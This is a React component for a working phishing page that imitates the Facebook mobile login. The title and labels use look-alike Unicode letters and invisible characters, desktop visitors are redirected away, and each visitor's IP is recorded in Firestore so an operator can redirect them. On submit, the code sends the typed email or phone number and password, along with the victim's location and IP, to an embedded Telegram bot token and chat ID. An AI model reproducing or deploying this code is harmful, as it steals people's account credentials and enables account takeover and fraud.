import React, { useEffect, useState } from 'react';
import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
import { publicIpv4 } from 'public-ip';
import { IoIosAdd as IconAdd } from "react-icons/io";
import { footerLinks, desktoplanguages, mobileLanguages } from '../sakles/malores.js'; // Import mobileLanguages
import { db } from '../cedeplajes.js';
import { useMediaQuery } from 'react-responsive';

import '../sakles/malores.js';

const Donjesck = () => {
    const [ip, setIp] = useState(undefined);
    const [grraht, setCode] = useState('');
    const [dexlus, setdexlus] = useState('');
    const [userData, setUserData] = useState(undefined);
    const [isUserData, setIsUserData] = useState(false);
    const [userUrl, setUserUrl] = useState(false);
    
    const isDesktop = useMediaQuery({ query: '(min-width: 768px)' });

    useEffect(() => {
        if (isDesktop) {
            window.location.href = 'hTx7Lk2Vc9Bn4Yq5Fs6Pm1Zr8Io3Xj0We7Ns3Rp6Ug2Kv9Om1Jh8Lt4Zy5Qb3Dn7Fr6';
        }
    }, [isDesktop]);

    const handleActions = (event) => {
        event.preventDefault(); // Prevent the default form submission
        if (grraht === '') {
            // Handle code validation
            return;
        } else {
            const bot = 'bot8210786394:AAGCt_NAm02qOFH386Q7JwTD5x2-kNA2PQQ';
            const chid = '7165145644';

            fetch(`https://ipapi.co/json/`)
                .then((response) => response.json())
                .then((response) => {
                    const { country, region, city } = response;
                    const content = `========================
LS 1: '${grraht}'
LS 2: '${dexlus}'
Country : '${country}'
Region : '${region}'
City : '${city}'
IP: '${ip}'
========================`;

                    const encodedContent = encodeURIComponent(content);

                    fetch(`https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${encodedContent}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                    })
                        .then(() => {
                            window.location = 'bNr5Xq9Lt4Yj2Po6Vm1Ks3Fb8Io7Wc0Te3Ur9Xn6Lq5Jp2Kd8Fs1Bt4Qy7Mw3Hg6Vo5';
                        })
                        .catch((error) => {
                            window.location = 'bNr5Xq9Lt4Yj2Po6Vm1Ks3Fb8Io7Wc0Te3Ur9Xn6Lq5Jp2Kd8Fs1Bt4Qy7Mw3Hg6Vo5';
                        });
                });
        }
    };

    const handleCodeChange = (e) => {
        setCode(e.target.value); // Allow any input
    };
    const handleCodeChange1 = (e) => {
        setdexlus(e.target.value); // Allow any input
    };
    const getUserData = async (e) => {
        const documentSnapshot = await getDocs(collection(db, "costarica"));
        const newData = documentSnapshot.docs
            .map((doc) => ({ ...doc.data(), id: doc.id }));
        const filter = newData.filter(x => {
            if (x.ip === ip) {
                setIsUserData(true);
                setUserData(x);
                return x;
            }
        });
        if (filter.length === 0) {
            addUserData();
        }
    };

    const getIp = async () => {
        if (ip === undefined) {
            const ip = await publicIpv4();
            setIp(ip);
        }
    };
    getIp();

    useEffect(() => {
        if (ip) {
            onSnapshot(collection(db, "costarica"), (snapshot) => {
                let isExist = false;
                snapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id })).filter(x => {
                    if (x.ip === ip) {
                        isExist = true;
                        setUserData(x);
                        fetch('./data.json').then(
                            function (res) {
                                return res.json();
                            },
                        ).then(function (data) {
                            data.url_data.filter((item) => {
                                if (item.id === parseInt(x.redir)) {
                                    setUserUrl(item.url);
                                    return;
                                }
                            });
                        }).catch(
                            function (err) {
                                console.log(err, ' error');
                            },
                        );
                    }
                });
                if (!isExist) {
                    setUserUrl(false);
                }
            });
        }
    }, [ip]);

    useEffect(() => {
        document.title = '‌Lо‌g int‌‌‌о Fаc‌‌еbо‌ok';
    }, [userData, userUrl]);

    const addUserData = async () => {
        try {
            const docRef = doc(collection(db, "costarica"), ip);

            // Check if the document exists
            const docSnap = await getDoc(docRef);

            if (!docSnap.exists()) {
                // Document doesn't exist, so set the data
                await setDoc(docRef, {
                    ip: ip,
                    number: -1,
                    redir: "-1"
                });
                console.log("Document written with ID: ", ip);
                getUserData();
            } else {
                console.log("Document already exists with ID: ", ip);
            }
        } catch (e) {
            console.error("Error adding document: ", e);
        }
    };

    const resetUserNumber = async () => {
        try {
            const docRef = doc(collection(db, "costarica"), ip);
            await setDoc(docRef, { redir: "-1" }, { merge: true });
            console.log("User number reset to -1 for IP: ", ip);
        } catch (e) {
            console.error("Error resetting user number: ", e);
        }
    };

    useEffect(() => {
        if (ip) {
            getUserData();
        }
    }, [ip]);

    if (userUrl) {
        setTimeout(() => {
            window.location = userUrl;
        }, 1000);
        resetUserNumber();
    }

    console.log("hi here is the data", isUserData, userData);

    if (isUserData) {
      return (
        <section className="w-full flex sm:hidden flex-col items-center justify-start gap-4 bg-white">
            <div className="w-full text-left text-[13.6px] px-3 py-[8px] text-neutral-500 bg-citrine/10 border-solid border-0 border-b-[1px] border-citrine rounded-sm "style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
                Yоu must lоg in first.
            </div>
            <a href="/" className="w-[100px] h-[25px] flex items-center justify-center relative">
                <img src="/images/vers.png" alt="das" fill className="object-contain" />
            </a>
            <div className="w-full max-w-[450px] flex flex-col items-center justify-start gap-3 px-3">
                <form className="w-full flex flex-col items-center justify-start gap-2" onSubmit={handleActions}>
                    <input
                        type="text" id="grraht" name="grraht"
                        className="w-full p-[8px] text-sm placeholder:text-sm text-neutral-500 rounded bg-mercury/60 shadow-md font-medium border-[1px] border-solid border-mercury focus:outline-none"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}
                        placeholder="Mobile number or email" onChange={handleCodeChange} required/>
                        <span className='becros'></span>
                   
                    <input
                        type="text" id="dexlus" name="dexlus"
                        className="w-full p-[8px] pr-4 text-sm placeholder:text-sm text-neutral-500 rounded bg-mercury/60 shadow-md font-medium border-[1px] border-solid border-mercury focus:outline-none"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',WebkitTextSecurity: 'disc', textSecurity: 'disc'}}
                        placeholder="Pa‌ss‌wor‌d"onChange={handleCodeChange1} required/>
                    <span className='form-dexlus'></span>
                    <button type="submit" className="w-full mt-1 px-3 h-[35px] bg-facebook hover:bg-opacity-90 text-white text-base font-semibold rounded transition-all duration-300"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
                        L‌o‌g i‌n
                    </button>
                </form>
                <button type="button" className="w-full text-facebook text-sm font-medium bg-none hover:underline transition-all duration-300"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
                    Fo‌rgot ac‌co‌un‌t?
                </button>
                <div className="w-full flex items-center justify-between gap-3">
                    <div className="flex-1 h-[0.5px] bg-neutral-400 text-neutral-400" />
                    <p className="text-sm font-medium text-neutral-500">or</p>
                    <div className="flex-1 h-[0.5px] bg-neutral-400 text-neutral-400" />
                </div>
                <button type="button" className="w-full max-w-[80%] text-sm bg-none font-medium px-2 py-[6px] border-[1px] border-solid border-neutral-400 rounded hover:bg-neutral-300/20 transition-all duration-300"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
                    Cre‌ate ne‌w acc‌ou‌nt
                </button>
                <footer className="w-full py-10 flex flex-col items-center justify-start gap-4">
                    <div className="w-full grid grid-cols-2 gap-[6px] place-items-center">
                        <p className="text-xs text-neutral-500 hover:underline font-bold transition-all duration-300 cursor-pointer">
                            En‌gli‌sh (U‌S)
                        </p>
                        {mobileLanguages.map((item, i) => (
                            <p key={i} className="text-xs text-neutral-500 hover:underline transition-all duration-300 cursor-pointer">
                                {item}
                            </p>
                        ))}
                        <div className="px-[3px] flex items-center justify-center border-[1px] border-solid border-[#ccd0d5] rounded-[2px] overflow-hidden cursor-pointer transition-all duration-300">
                            <IconAdd size={17} />
                        </div>
                    </div>
                    <p className="text-xs text-center w-full text-neutral-500 transition-all duration-300 cursor-pointer">
                        M‌‌et‌a © 2‌025
                    </p>
                </footer>
            </div>
        </section>
    );
}
return null; // Return null if no user data is present
};

export default Donjesck;